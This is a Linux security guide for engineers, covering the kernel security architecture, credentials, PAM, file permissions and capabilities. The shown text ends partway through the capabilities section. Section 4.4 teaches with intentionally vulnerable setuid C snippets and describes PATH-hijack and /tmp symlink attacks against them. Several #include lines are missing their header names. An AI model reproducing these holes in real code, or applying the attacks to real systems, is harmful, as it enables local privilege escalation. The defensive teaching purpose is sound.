# Linux Cybersecurity: A Complete & Comprehensive Guide
## For Senior Security Engineers and Systems Developers

> **Audience**: Senior security/systems engineers working with cloud, data-center, container runtimes, CNCF projects.
> **Scope**: Kernel internals → exploitation → defense → secure coding in C, Go, Rust.
> **Philosophy**: Security-first, first-principles, production-grade, threat-modeled.

---

## Table of Contents

1. [Linux Security Architecture: First Principles](#1-linux-security-architecture-first-principles)
2. [Linux Kernel Internals and Security Boundaries](#2-linux-kernel-internals-and-security-boundaries)
3. [Identity, Credentials, and the Linux Trust Model](#3-identity-credentials-and-the-linux-trust-model)
4. [Discretionary Access Control (DAC)](#4-discretionary-access-control-dac)
5. [Linux Capabilities](#5-linux-capabilities)
6. [Mandatory Access Control: SELinux and AppArmor](#6-mandatory-access-control-selinux-and-apparmor)
7. [Linux Namespaces: Isolation Primitives](#7-linux-namespaces-isolation-primitives)
8. [Control Groups (cgroups): Resource Isolation](#8-control-groups-cgroups-resource-isolation)
9. [Seccomp: System Call Filtering](#9-seccomp-system-call-filtering)
10. [Memory Safety and Exploitation Mitigations](#10-memory-safety-and-exploitation-mitigations)
11. [Kernel Exploitation Classes](#11-kernel-exploitation-classes)
12. [Userspace Exploitation: Stack, Heap, and Beyond](#12-userspace-exploitation-stack-heap-and-beyond)
13. [Linux Networking Security](#13-linux-networking-security)
14. [Cryptography in Linux](#14-cryptography-in-linux)
15. [eBPF: Power, Observability, and Attack Surface](#15-ebpf-power-observability-and-attack-surface)
16. [Audit Framework and Intrusion Detection](#16-audit-framework-and-intrusion-detection)
17. [Supply Chain and Binary Security](#17-supply-chain-and-binary-security)
18. [Container Security Internals](#18-container-security-internals)
19. [Secure Coding: C, Go, Rust - Vulnerabilities and Mitigations](#19-secure-coding-c-go-rust---vulnerabilities-and-mitigations)
20. [Fuzzing and Vulnerability Discovery](#20-fuzzing-and-vulnerability-discovery)
21. [Privilege Escalation Techniques and Defenses](#21-privilege-escalation-techniques-and-defenses)
22. [Linux Hardening: Production Checklist](#22-linux-hardening-production-checklist)
23. [Threat Modeling Linux Systems](#23-threat-modeling-linux-systems)
24. [Incident Response on Linux](#24-incident-response-on-linux)
25. [References and Further Reading](#25-references-and-further-reading)

---

## 1. Linux Security Architecture: First Principles

### 1.1 The Unix Security Model: Origin and Philosophy

Linux inherits its security model from Unix, developed at Bell Labs in the late 1960s. The foundational design choices were made when security was not the primary concern — the system was designed for trusted, time-shared academic use. Understanding this origin is critical because many of Linux's security properties (and vulnerabilities) are direct consequences of these early decisions.

The three pillars of the original Unix security model:

1. **Everything is a file** — Devices, sockets, pipes, and processes are all represented as files in the VFS. This unification means the same permission system that protects regular files also governs access to hardware devices.

2. **Small, composable tools** — Security is emergent from composition. No single tool is monolithic; they pipe data between each other. This composability also means attack surface is distributed.

3. **Superuser (root) has absolute power** — UID 0 is omnipotent. This binary trust model (root vs. non-root) is the original sin of Unix security. Everything built on top of this model must work around the fact that UID 0 can do anything.

### 1.2 The Modern Linux Security Model

The modern Linux kernel has evolved dramatically from this original model. Today's Linux security architecture is a layered, defense-in-depth system:

```
+-------------------------------------------------------+
|                   HARDWARE LAYER                       |
|  CPU rings (Ring 0/3), IOMMU, TrustZone, HSM, TPM     |
+-------------------------------------------------------+
|                   KERNEL SPACE (Ring 0)                |
|  +---------------------------------------------------+ |
|  | Linux Security Modules (LSM) Hook Framework       | |
|  | SELinux | AppArmor | Smack | TOMOYO | Landlock    | |
|  +---------------------------------------------------+ |
|  | Core Kernel Security Subsystems                   | |
|  | Capabilities | Namespaces | cgroups | Seccomp     | |
|  +---------------------------------------------------+ |
|  | Memory Subsystem                                  | |
|  | ASLR | SMEP | SMAP | KPTI | CET | Stack Canaries  | |
|  +---------------------------------------------------+ |
|  | VFS / IPC / Network Stack                        | |
|  | DAC (Unix permissions) | ACLs | Extended Attrs    | |
|  +---------------------------------------------------+ |
+-------------------------------------------------------+
|                   USERSPACE (Ring 3)                   |
|  glibc / musl | PAM | sudo | dbus | systemd           |
|  Containers: runc/crun | kata-containers              |
|  Applications                                          |
+-------------------------------------------------------+
```

### 1.3 Security Principals and the Reference Monitor

At the heart of OS security theory is the **reference monitor** concept. A reference monitor:

- **Mediates** every access between subjects (processes) and objects (files, sockets, IPC).
- Is **tamper-proof** — cannot be bypassed or modified by untrusted subjects.
- Is **always invoked** — there are no back doors or alternative paths.
- Is **small enough to be verifiable** — the Trusted Computing Base (TCB).

The Linux kernel's system call interface IS the reference monitor boundary. Every userspace action that affects security-relevant state must go through a syscall, which is intercepted by the kernel. The LSM framework adds additional hooks within the kernel for MAC enforcement.

```
Process (subject)
      |
      v
  System Call Interface  <--- Reference Monitor Boundary
      |
      v
  Kernel Enforcement:
  1. Capability checks    (CAP_NET_ADMIN, CAP_SYS_ADMIN, etc.)
  2. DAC checks           (UID/GID/mode bits)
  3. LSM hooks            (SELinux/AppArmor policy)
  4. Audit logging        (auditd)
      |
      v
  Object (file, socket, process, memory)
```

### 1.4 Trust Boundaries in Linux

A trust boundary is a point where data or control crosses from one trust level to another. Identifying these boundaries is the first step in threat modeling.

**Kernel ↔ Userspace boundary**: The system call interface. Any data flowing from userspace must be treated as untrusted by the kernel. Kernel bugs at this boundary (e.g., failing to validate user pointers with `copy_from_user()`) are catastrophic.

**Process ↔ Process boundary**: IPC mechanisms (pipes, sockets, shared memory, signals). A process receiving data from another process must validate it unless the sender is trusted at the same privilege level.

**Network boundary**: Packets arriving from the network are completely untrusted. The network stack, from driver through TCP/IP to application, must enforce this.

**Privilege boundary (setuid/capabilities)**: When a process executes a setuid binary or gains capabilities, it crosses from user-level to elevated trust. This transition must be carefully controlled.

**Hypervisor ↔ Guest boundary**: In virtualized environments, the hypervisor enforces isolation between guests. A guest kernel is untrusted code from the hypervisor's perspective.

### 1.5 Defense-in-Depth Strategy

Defense-in-depth means that no single security control is relied upon. Each layer assumes the previous layer has been compromised:

```
Layer 1: Preventive Controls
  - Seccomp filters (syscall allowlist)
  - Capabilities (drop unnecessary privileges)
  - Namespaces (limit visibility)
  - SELinux/AppArmor (MAC policy)

Layer 2: Detective Controls
  - Audit framework (auditd)
  - eBPF-based monitoring (Falco, Tetragon)
  - Kernel integrity (IMA/EVM)
  - System call tracing

Layer 3: Corrective Controls
  - Automatic process termination on policy violation
  - Incident response playbooks
  - Read-only rootfs
  - Immutable infrastructure

Layer 4: Recovery Controls
  - Signed backups
  - Verified boot (dm-verity)
  - Rollback capability
  - Forensic preservation
```

---

## 2. Linux Kernel Internals and Security Boundaries

### 2.1 Kernel Architecture Overview

The Linux kernel is a monolithic kernel with loadable module support. This means the entire kernel runs in a single address space (kernel space) with Ring 0 privileges. All kernel code has access to all kernel data structures and hardware.

This is architecturally different from microkernel designs (like seL4, Minix) where kernel components run in separate address spaces. The monolithic design trades security isolation for performance — a compromise with profound security implications.

**Key kernel subsystems relevant to security:**

```
Linux Kernel Architecture (Security-Relevant Subsystems)
=========================================================

+------------------------------------------------------------------+
|  System Call Interface (entry.S / syscall table)                |
+------------------------------------------------------------------+
|  Process Management    |  Memory Management    |  VFS           |
|  - fork/exec/clone     |  - page allocator     |  - file ops    |
|  - scheduler           |  - mmap/brk           |  - namespaces  |
|  - signals             |  - COW                |  - ACLs        |
+------------------------------------------------------------------+
|  Security Subsystem                                              |
|  - Capabilities        |  - LSM framework      |  - Namespaces  |
|  - Seccomp             |  - Audit              |  - Keyring     |
+------------------------------------------------------------------+
|  Network Stack         |  IPC                  |  Device Drivers|
|  - netfilter           |  - sockets            |  - char/block  |
|  - eBPF               |  - pipes/FIFOs        |  - IOMMU       |
+------------------------------------------------------------------+
|  Architecture-Specific (x86_64)                                 |
|  - SMEP/SMAP/CET       |  - KPTI               |  - CR4/EFER   |
+------------------------------------------------------------------+
```

### 2.2 CPU Privilege Rings and Mode Switching

On x86_64, the CPU has four privilege rings (0–3). Linux uses only Ring 0 (kernel) and Ring 3 (userspace). Rings 1 and 2 are unused in Linux (historically used for OS/2 and some driver models).

**Ring 0 (Kernel Mode):**
- Access to all CPU instructions including privileged ones (LGDT, LIDT, CLI, STI, HLT, RDMSR, WRMSR)
- Access to all memory including other processes' memory
- Can modify page tables, CR3 (page table base), CR4 (feature flags)
- Direct hardware access

**Ring 3 (User Mode):**
- Cannot execute privileged instructions (fault → #GP)
- Can only access memory mapped in its page tables
- System calls are the ONLY legitimate way to request kernel services

**The syscall mechanism (x86_64 SYSCALL/SYSRET):**

```
User Process (Ring 3)
      |
      | syscall instruction
      v
CPU saves RIP, RFLAGS, RSP to kernel stack (via MSR IA32_LSTAR)
CPU switches to Ring 0
CPU loads kernel stack pointer (MSR IA32_KERNEL_GS_BASE)
      |
      v
entry_SYSCALL_64 (arch/x86/entry/entry_64.S)
  1. swapgs (switch GS base to kernel percpu area)
  2. save user registers to pt_regs on kernel stack
  3. call do_syscall_64()
  4. lookup syscall table by RAX (syscall number)
  5. execute syscall handler
  6. restore registers
  7. sysret back to Ring 3
```

**Security implication**: The `swapgs` instruction has been the source of serious vulnerabilities. The Spectre variant (SwapGS Spectre gadget) allows information disclosure across the syscall boundary via speculative execution. Mitigations involve `LFENCE` barriers after `swapgs`.

### 2.3 The System Call Table and Attack Surface

The system call table (`sys_call_table`) maps syscall numbers to kernel function pointers. On x86_64, there are approximately 450+ syscalls. Each syscall is an attack surface entry point.

```bash
# Count syscalls on your system
ausyscall --dump | wc -l

# See what syscalls a process uses
strace -c -p 

# See all allowed syscalls for a container
cat /proc//status | grep Seccomp
```

**High-risk syscalls from a security perspective:**

| Syscall | Risk | Reason |
|---------|------|--------|
| `ptrace` | Critical | Process injection, memory read/write |
| `mmap` (PROT_EXEC) | High | Executable memory allocation |
| `execve` | High | Process replacement, privilege escalation chain |
| `clone` | High | Namespace manipulation |
| `prctl` | High | Process attribute modification (seccomp, capabilities) |
| `ioctl` | High | Driver-specific operations, massive attack surface |
| `perf_event_open` | High | Side-channel leaks |
| `bpf` | High | Kernel code execution if verifier bug |
| `keyctl` | Medium | Keyring manipulation |
| `mount` | Critical | Filesystem namespace attacks |

### 2.4 Kernel Memory Layout (x86_64)

Understanding kernel memory layout is essential for exploit development (offensive) and mitigation design (defensive).

```
x86_64 Virtual Address Space (canonical layout)
================================================

0x0000000000000000  +---------------------------------+
                    |    User Space                   |  (128 TB)
                    |    (per-process)                |
                    |    Text, Data, Heap, Stack      |
                    |    mmap regions                 |
0x00007FFFFFFFFFFF  +---------------------------------+
                    |    Non-canonical addresses      |
                    |    (hardware enforced hole)     |
0xFFFF800000000000  +---------------------------------+
                    |    Kernel Space                 |  (128 TB)
                    |                                 |
0xFFFF888000000000  |    Direct Map (physmap)         |
                    |    (all physical memory mapped) |
                    |                                 |
0xFFFFC90000000000  |    vmalloc area                 |
                    |                                 |
0xFFFFE90000000000  |    vmemmap                      |
                    |                                 |
0xFFFFFF0000000000  |    %esp fixup stacks            |
                    |                                 |
0xFFFFFF5000000000  |    cpu_entry_area               |
                    |    (mapped to Ring 3 for SYSCALL|
                    |     entry - KPTI exception)     |
                    |                                 |
0xFFFFFFFF80000000  |    Kernel text/data/BSS         |
                    |    (KASLR randomized base)      |
0xFFFFFFFFFFFFFFFF  +---------------------------------+
```

**Critical security properties:**

1. **KASLR (Kernel Address Space Layout Randomization)**: The kernel base address is randomized at boot time. An attacker needs to leak a kernel address before attempting a kernel exploit. Mitigated by: avoiding information disclosures, `/proc/kallsyms` restriction (`kptr_restrict=2`).

2. **KPTI (Kernel Page Table Isolation)**: Introduced after Meltdown (CVE-2017-5754). Separates kernel and user page tables. When in user mode, the kernel text/data is unmapped (except for the minimal syscall entry trampoline). Prevents Meltdown-class attacks at the cost of ~5-30% syscall overhead.

3. **Physmap / Direct Map**: The entire physical memory is mapped in kernel space starting at `0xFFFF888000000000`. This means a kernel heap spray that lands in physmap can be accessed with a known virtual address if the attacker knows the physical address. Structured Page Tables (SPT) and physmap randomization partially mitigate this.

### 2.5 The Linux Security Module (LSM) Framework

The LSM framework is a set of hooks distributed throughout the kernel that allow security modules to inspect and enforce policy on security-sensitive operations. It was introduced in 2.6 and is the foundation for SELinux, AppArmor, Smack, TOMOYO, Yama, and Landlock.

**LSM hook mechanism:**

```c
/* Example: security_file_open hook in fs/open.c */
int do_dentry_open(struct file *f, struct inode *inode, ...)
{
    /* ... setup ... */
    
    /* LSM hook - each enabled LSM gets to inspect this open */
    error = security_file_open(f);
    if (error)
        goto cleanup_all;
    
    /* ... continue with open ... */
}
```

**The hook call chain:**

```
do_dentry_open()
    |
    v
security_file_open()    [kernel/security.c]
    |
    v
call_int_hook(file_open, 0, f)
    |
    +---> selinux_file_open()    [if SELinux enabled]
    |
    +---> apparmor_file_open()   [if AppArmor enabled]
    |
    +---> smack_file_open()      [if Smack enabled]
    |
    (first non-zero return value short-circuits)
```

**LSM stacking (since 5.x)**: Multiple LSMs can be active simultaneously. The `lsm=` kernel parameter controls which LSMs are active and their order.

```bash
# See active LSMs
cat /sys/kernel/security/lsm

# Example output:
lockdown,capability,landlock,yama,apparmor
```

**Key LSM hooks by security domain:**

```
File operations:    security_inode_create, security_file_open,
                    security_file_permission, security_inode_unlink

Process operations: security_task_alloc, security_bprm_check,
                    security_bprm_committed_creds, security_ptrace_access_check

Network:            security_socket_create, security_socket_connect,
                    security_socket_bind, security_sock_rcv_skb

IPC:                security_msg_queue_msgsnd, security_shm_shmat
                    security_sem_semop

Kernel:             security_capable, security_syslog, security_settime64
```

### 2.6 Kernel Integrity and Verified Boot

**Integrity Measurement Architecture (IMA)**:
IMA measures (hashes) files before execution and optionally enforces policy. It integrates with the TPM to provide remote attestation.

```bash
# Check IMA status
cat /sys/kernel/security/ima/policy

# IMA policy example: measure all executables
echo "measure func=BPRM_CHECK" > /sys/kernel/security/ima/policy

# View IMA measurement log
cat /sys/kernel/security/ima/ascii_runtime_measurements
```

**Extended Verification Module (EVM)**:
EVM protects file metadata (permissions, ownership, xattrs) by computing an HMAC over the metadata. If metadata is tampered with offline, EVM will detect it at runtime.

```bash
# EVM status
cat /sys/kernel/security/evm
# 0 = disabled, 1 = active, 2 = ignore tampering (for setup)

# Initialize EVM key
keyctl add encrypted evm-key "new default user:kmk 32" @u
```

**dm-verity (Block Device Integrity)**:
dm-verity constructs a Merkle tree over block device data. The root hash is stored in a trusted location (TPM, signed boot). Any modification to the block device is detected at read time.

```bash
# Create a verity device
veritysetup format /dev/sda1 /dev/sda2  # device + hash device
# Output: Root hash: 

# Open for use
veritysetup open /dev/sda1 protected /dev/sda2 

# Mount
mount /dev/mapper/protected /mnt/root
```

**Secure Boot → Boot Integrity Chain:**

```
UEFI Secure Boot (firmware-level)
    |   verifies SHIM/GRUB signature (Microsoft-signed)
    v
SHIM
    |   verifies GRUB signature (distro key)
    v
GRUB
    |   verifies kernel signature (distro key)
    v
Kernel
    |   IMA/EVM verifies userspace files
    |   dm-verity verifies root filesystem
    v
Trusted Userspace
```

**Lockdown mode** (since kernel 5.4): When Secure Boot is enabled or explicitly activated, lockdown mode prevents actions that could subvert kernel integrity:
- Blocks `/dev/mem` and `/dev/kmem` access
- Blocks `/proc/kcore`
- Blocks kprobes/ftrace
- Blocks loading unsigned modules
- Blocks hibernation (could restore unsigned kernel state)

```bash
# Check lockdown mode
cat /sys/kernel/security/lockdown
# [none] integrity confidentiality

# Set confidentiality mode (strictest)
echo confidentiality > /sys/kernel/security/lockdown
```

---

## 3. Identity, Credentials, and the Linux Trust Model

### 3.1 The Credential Model

Every Linux process has a `struct cred` that defines its security identity:

```c
/* include/linux/cred.h - simplified */
struct cred {
    atomic_long_t   usage;
    kuid_t          uid;        /* real UID of the task */
    kgid_t          gid;        /* real GID of the task */
    kuid_t          suid;       /* saved UID of the task */
    kgid_t          sgid;       /* saved GID of the task */
    kuid_t          euid;       /* effective UID of the task */
    kgid_t          egid;       /* effective GID of the task */
    kuid_t          fsuid;      /* UID for VFS operations */
    kgid_t          fsgid;      /* GID for VFS operations */
    unsigned        securebits; /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;   /* caps we're permitted to use */
    kernel_cap_t    cap_effective;   /* caps we can actually use */
    kernel_cap_t    cap_bset;        /* capability bounding set */
    kernel_cap_t    cap_ambient;     /* ambient capability set */
    /* ... LSM blobs ... */
    struct user_struct *user;   /* real user ID subscription */
    struct user_namespace *user_ns; /* user namespace */
    struct group_info *group_info;  /* supplementary groups */
    /* ... */
};
```

**The three UIDs** (and why they matter):

| UID | Purpose | Security Impact |
|-----|---------|-----------------|
| **Real UID** (ruid) | Who actually owns the process | Used for signal permission checks |
| **Effective UID** (euid) | Used for most permission checks | What "matters" for file access |
| **Saved set-UID** (suid) | Allows dropping/re-raising euid | Enables temporary privilege drop |
| **Filesystem UID** (fsuid) | VFS permission checks | Normally equals euid; NFS server use |

**setuid/setgid mechanics:**

When a process executes a setuid-root binary:
1. `execve()` → kernel reads inode's setuid bit
2. `prepare_bprm_creds()` → copies parent creds
3. `bprm_fill_uid()` → if setuid, euid = file owner's UID
4. LSM `security_bprm_check()` → MAC check
5. `commit_creds()` → atomically installs new creds

```bash
# Inspect process credentials
cat /proc//status | grep -E 'Uid|Gid|Cap'

# Output example:
# Uid:    1000    0    0    0  (real, effective, saved, fsuid)
# Gid:    1000    0    0    0
# CapInh: 0000000000000000
# CapPrm: 000001ffffffffff
# CapEff: 000001ffffffffff
# CapBnd: 000001ffffffffff
# CapAmb: 0000000000000000
```

### 3.2 User Namespaces and UID Mapping

User namespaces allow unprivileged users to create isolated UID/GID spaces. Inside a user namespace, a process can be UID 0 (root within that namespace) while being an unprivileged user in the parent namespace.

```bash
# Create a user namespace as non-root
unshare --user --map-root-user /bin/bash

# Inside: you appear as root
id  # uid=0(root) gid=0(root)

# Check the UID mapping
cat /proc/self/uid_map
# 0    1000   1  (namespace-uid: 0 maps to host-uid: 1000, count: 1)
```

**Security implications of user namespaces:**

1. **Privilege escalation surface**: User namespaces dramatically increase the kernel attack surface because unprivileged users can now trigger code paths that previously required root. Many kernel CVEs (e.g., CVE-2021-22555, CVE-2022-0185) are exploitable via user namespaces.

2. **Container isolation**: Docker, Podman, and container runtimes use user namespaces to map container root (UID 0) to unprivileged host UIDs, limiting host damage if container escapes.

3. **Restricting user namespaces**:

```bash
# Disable unprivileged user namespace creation (Debian/Ubuntu)
sysctl -w kernel.unprivileged_userns_clone=0

# On RHEL/CentOS (kernel.unprivileged_userns_clone may not exist):
# Use AppArmor/SELinux policy to restrict unshare

# Audit user namespace creation
auditctl -a always,exit -F arch=b64 -S unshare -k userns_create
```

### 3.3 The Kernel Keyring

The Linux kernel keyring (`/proc/keys`) provides a place for processes, kernel services, and filesystems to store authentication tokens, encryption keys, and credentials securely in the kernel.

```bash
# List keys in current session keyring
keyctl list @s

# Add a key
keyctl add user mykey "my secret value" @u

# Link to session
keyctl link @u @s

# Read a key (only permitted principals can read)
keyctl print 
```

**Keyring hierarchy:**

```
Thread keyring   (@t) - per thread
    |
Process keyring  (@p) - per process
    |
Session keyring  (@s) - per login session
    |
User keyring     (@u) - per UID
    |
User session     (@us)
    |
Group keyring    (GID-based)
    |
System keyring   (persistent, survives logout)
```

**Security uses of keyrings:**
- LUKS key storage during boot (dracut)
- Kerberos credential caching (pam_keyinit)
- NFS Kerberos credentials
- eCryptfs per-file encryption keys
- IMA/EVM HMAC keys
- Kernel module signing keys

**CVE-2016-0728 (KeyRing Privilege Escalation)**: A use-after-free bug in the keyring subsystem allowed local privilege escalation. This illustrates that even security-specific kernel subsystems can contain critical vulnerabilities.

### 3.4 PAM (Pluggable Authentication Modules)

PAM is the userspace authentication framework. It sits between applications (login, sshd, sudo) and the actual authentication mechanisms (passwords, LDAP, TOTP, certificates).

```
Application (sshd, sudo, login)
      |
      v
libpam (dispatches to modules)
      |
      +---> pam_unix.so    (local passwords /etc/shadow)
      |
      +---> pam_ldap.so    (LDAP/AD authentication)
      |
      +---> pam_google_authenticator.so (TOTP)
      |
      +---> pam_limits.so  (resource limits)
      |
      +---> pam_tally2.so  (login attempt counting)
```

**PAM configuration** (`/etc/pam.d/sshd`):

```
# Type    Control    Module           Arguments
auth      required   pam_faillock.so  preauth silent audit deny=5 unlock_time=900
auth      required   pam_unix.so      nullok
auth      required   pam_faillock.so  authfail audit deny=5 unlock_time=900
auth      required   pam_google_authenticator.so  nullok

account   required   pam_unix.so
account   required   pam_faillock.so

password  required   pam_pwquality.so retry=3 minlen=16 difok=4 \
                                       ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1
password  required   pam_unix.so      sha512 shadow nullok use_authtok

session   required   pam_limits.so
session   required   pam_loginuid.so
session   optional   pam_systemd.so
```

**PAM stack semantics:**

| Control | Meaning |
|---------|---------|
| `required` | Must succeed, but continues stack (hides which module failed) |
| `requisite` | Must succeed, immediately fails if not |
| `sufficient` | If succeeds, skip remaining (if no prior failure) |
| `optional` | Doesn't affect overall result |
| `include` | Include another PAM config file |

---

## 4. Discretionary Access Control (DAC)

### 4.1 Unix File Permissions: The Foundation

The Unix permission system is the first layer of access control. Every file and directory has:

```
-rwxr-xr-- 1 alice developers 4096 Jan 1 00:00 example

|  Mode   | Links | Owner | Group       | Size | Date | Name
+---------+-------+-------+-------------+------+------+------
| -rwxr-xr-- |

Bit breakdown:
Position 1:    File type (- = regular, d = dir, l = symlink, c = char dev, b = block dev, s = socket, p = pipe)
Positions 2-4: Owner permissions (rwx = read, write, execute = 111 binary = 7 octal)
Positions 5-7: Group permissions (r-x = 101 = 5)
Positions 8-10: Other permissions (r-- = 100 = 4)

Special bits:
Bit 12: setuid (s/S in owner execute position)
Bit 11: setgid (s/S in group execute position)
Bit 10: sticky (t/T in other execute position)
```

**Octal notation:**

```bash
chmod 4755 file   # setuid + rwxr-xr-x
chmod 2755 dir    # setgid + rwxr-xr-x
chmod 1777 /tmp   # sticky + rwxrwxrwx
chmod 0700 ~/.ssh # rwx------
```

**How the kernel checks permissions:**

```c
/* fs/namei.c - simplified permission check */
int inode_permission(struct user_namespace *mnt_userns,
                     struct inode *inode, int mask)
{
    int retval;

    /* 1. Check if calling process is UID 0 (root bypass for DAC) */
    if (capable(CAP_DAC_OVERRIDE))
        return 0;  /* root can access anything (except exec without x) */

    /* 2. Compare process euid to inode uid */
    if (uid_eq(current_fsuid(), inode->i_uid)) {
        /* Owner: check owner bits */
        mode = (inode->i_mode >> 6) & 0007;
    } else if (in_group_p(inode->i_gid)) {
        /* Group member: check group bits */
        mode = (inode->i_mode >> 3) & 0007;
    } else {
        /* Other: check other bits */
        mode = inode->i_mode & 0007;
    }

    if ((mask & ~mode & (MAY_READ | MAY_WRITE | MAY_EXEC)) == 0)
        return 0;

    /* 3. Check LSM (SELinux/AppArmor) */
    retval = security_inode_permission(inode, mask);
    return retval;
}
```

### 4.2 Access Control Lists (ACLs)

POSIX ACLs extend the basic permission model to allow per-user and per-group access entries without changing file ownership.

```bash
# Set ACL: give user bob read access
setfacl -m u:bob:r file.txt

# Set default ACL on directory (inherited by new files)
setfacl -d -m g:developers:rw /project

# View ACLs
getfacl file.txt

# Output:
# file: file.txt
# owner: alice
# group: developers
# user::rw-
# user:bob:r--
# group::r--
# mask::r--
# other::---

# Remove ACL
setfacl -b file.txt
```

**ACL mask**: The mask entry limits the maximum permissions for named users and groups (not the owner or other). It's calculated as the union of all named entries' permissions when not explicitly set.

### 4.3 Extended Attributes (xattrs)

Extended attributes store metadata beyond the standard inode attributes. Security namespaces of xattrs are used for:

```bash
# Security namespace (SELinux labels, IMA hashes, capabilities)
getfattr -n security.selinux /bin/bash
getfattr -n security.ima /bin/bash
getfattr -n security.capability /usr/bin/ping

# User namespace (application metadata)
setfattr -n user.author -v "alice" document.txt

# Trusted namespace (root only)
setfattr -n trusted.overlay.opaque -v "y" .  # overlayfs use
```

### 4.4 Setuid Vulnerabilities and mitigations

Setuid binaries run with the file owner's privileges (often root). They are extremely high-value targets.

**Common setuid attack patterns:**

**1. Environment variable injection (classic):**

```c
/* VULNERABLE: uses PATH from environment */
int main() {
    system("ls");  /* Looks up "ls" in PATH */
}

/* Attack: PATH=/tmp /path/to/setuid-binary
   Create /tmp/ls that's actually a shell */
```

**2. Symlink following in /tmp:**

```c
/* VULNERABLE: predictable temp file */
char *tmpfile = "/tmp/myapp.lock";
int fd = open(tmpfile, O_WRONLY|O_CREAT, 0600);
/* Attacker creates symlink: /tmp/myapp.lock -> /etc/passwd */
/* setuid binary now writes to /etc/passwd */
```

**Secure temp file pattern (C):**

```c
#include 
#include 
#include 
#include <sys/stat.h>
#include 
#include 
#include 

/* SECURE: Use mkstemp for atomic creation */
int secure_tempfile(char *path_out, size_t path_size) {
    const char *tmpdir = getenv("TMPDIR");
    if (!tmpdir || *tmpdir == '\0') tmpdir = "/tmp";
    
    /* Validate TMPDIR doesn't have symlinks */
    struct stat st;
    if (lstat(tmpdir, &st) != 0) return -1;
    if (!S_ISDIR(st.st_mode)) return -1;
    
    int written = snprintf(path_out, path_size, "%s/myapp.XXXXXX", tmpdir);
    if (written < 0 || (size_t)written >= path_size) {
        errno = ENAMETOOLONG;
        return -1;
    }
    
    /* mkstemp: atomically creates file, returns open fd */
    int fd = mkstemp(path_out);
    if (fd == -1) return -1;
    
    /* Set restrictive permissions (mkstemp creates 0600) */
    if (fchmod(fd, 0600) != 0) {
        close(fd);
        unlink(path_out);
        return -1;
    }
    
    return fd;
}
```

**3. Privilege dropping in setuid programs:**

```c
#include 
#include <sys/types.h>
#include 
#include 

/* Pattern: gain privileges, do task, drop permanently */
int main(void) {
    uid_t real_uid = getuid();
    uid_t eff_uid  = geteuid();  /* Will be 0 for setuid-root */
    
    /* Verify we're running setuid */
    if (eff_uid != 0 && real_uid != 0) {
        fprintf(stderr, "Not running setuid-root\n");
        return 1;
    }
    
    /* --- Do privileged work here --- */
    /* ... open raw socket, bind port 443, etc. ... */
    
    /* PERMANENTLY drop root privileges */
    /* Must set GID before UID (can't change GID as non-root) */
    if (setgroups(0, NULL) != 0) {  /* Clear supplementary groups */
        perror("setgroups");
        return 1;
    }
    if (setgid(real_uid) != 0) {    /* Use uid as gid for simplicity */
        perror("setgid");
        return 1;
    }
    if (setuid(real_uid) != 0) {    /* Drop to real UID */
        perror("setuid");
        return 1;
    }
    
    /* Verify: cannot regain root */
    if (setuid(0) != -1) {
        fprintf(stderr, "FATAL: Could regain root!\n");
        exit(1);
    }
    
    /* Now run with real UID */
    /* --- Unprivileged work here --- */
    
    return 0;
}
```

### 4.5 umask and Default Permissions

The `umask` (user file creation mask) defines which permission bits are masked out (removed) when creating new files:

```bash
# Default umask for most systems
umask        # 0022
# Effect: 0666 & ~0022 = 0644 for files
#         0777 & ~0022 = 0755 for dirs

# Restrictive umask for security-sensitive processes
umask 0027   # Files: 0640, Dirs: 0750
umask 0077   # Files: 0600, Dirs: 0700 (maximum restriction)
```

**Production recommendation**: System services should run with `umask 0027` or stricter. World-readable logs or temp files can leak sensitive data.

---

## 5. Linux Capabilities

### 5.1 The Capability System: Breaking Up Root

Capabilities (since Linux 2.2) decompose the omnipotent `root` privilege into ~41 individual capabilities. The goal: principle of least privilege — a process gets only the specific privileges it needs.

**Complete capability list (security-critical ones):**

| Capability | Description | Risk Level |
|-----------|-------------|------------|
| `CAP_SYS_ADMIN` | Catch-all administrative cap (~25 operations) | **CRITICAL** |
| `CAP_SYS_PTRACE` | ptrace any process | **CRITICAL** |
| `CAP_SYS_MODULE` | Load/unload kernel modules | **CRITICAL** |
| `CAP_DAC_OVERRIDE` | Bypass file read/write/execute permissions | **HIGH** |
| `CAP_DAC_READ_SEARCH` | Bypass file read and directory search permissions | **HIGH** |
| `CAP_NET_ADMIN` | Interface config, routing, iptables, ARP spoofing | **HIGH** |
| `CAP_NET_RAW` | Raw sockets, packet capture | **HIGH** |
| `CAP_SYS_RAWIO` | Raw I/O: /dev/mem, /dev/kmem, iopl() | **HIGH** |
| `CAP_SYS_CHROOT` | chroot(), but can escape without MAC | **MEDIUM** |
| `CAP_SETUID` | Set arbitrary UIDs | **HIGH** |
| `CAP_SETGID` | Set arbitrary GIDs | **HIGH** |
| `CAP_AUDIT_WRITE` | Write to audit log | **MEDIUM** |
| `CAP_FOWNER` | Bypass ownership checks | **HIGH** |
| `CAP_KILL` | Send signals to any process | **MEDIUM** |
| `CAP_NET_BIND_SERVICE` | Bind ports < 1024 | **LOW** |
| `CAP_SYS_NICE` | Set process priorities | **LOW** |
| `CAP_SYS_TIME` | Set system time | **MEDIUM** |
| `CAP_MKNOD` | Create special files | **MEDIUM** |
| `CAP_SYS_BOOT` | reboot(), kexec_load() | **HIGH** |
| `CAP_LINUX_IMMUTABLE` | Set immutable/append-only file attributes | **MEDIUM** |
| `CAP_PERFMON` | Performance monitoring (replaces CAP_SYS_ADMIN for perf) | **MEDIUM** |
| `CAP_BPF` | BPF operations (5.8+, replaces CAP_SYS_ADMIN for BPF) | **MEDIUM** |
| `CAP_CHECKPOINT_RESTORE` | CRIU checkpoint/restore | **HIGH** |

### 5.2 Capability Sets

Each process has five capability sets:

```
Permitted (P):    Maximum set the process can have in effective
Effective (E):    Currently active capabilities (used for checks)
Inheritable (I):  Capabilities preserved across execve
Bounding (B):     Upper bound on capabilities (cannot add beyond)
Ambient (A):      Capabilities automatically inherited by exec'd programs
```

**Capability transitions on execve:**

```
New Permitted  = (Inheritable & File_Inheritable) | (File_Permitted & Bounding)
New Effective  = (New_Permitted & File_Effective) | (Ambient & File_Effective_bit_set)
New Inheritable = Inheritable & Bounding (for non-ambient)
New Ambient    = Ambient  (if exec'd binary has file caps or is setuid)
```

**Working with capabilities in practice:**

```bash
# Give a binary specific capabilities (instead of setuid root)
setcap 'cap_net_bind_service=ep' /usr/bin/my-webserver
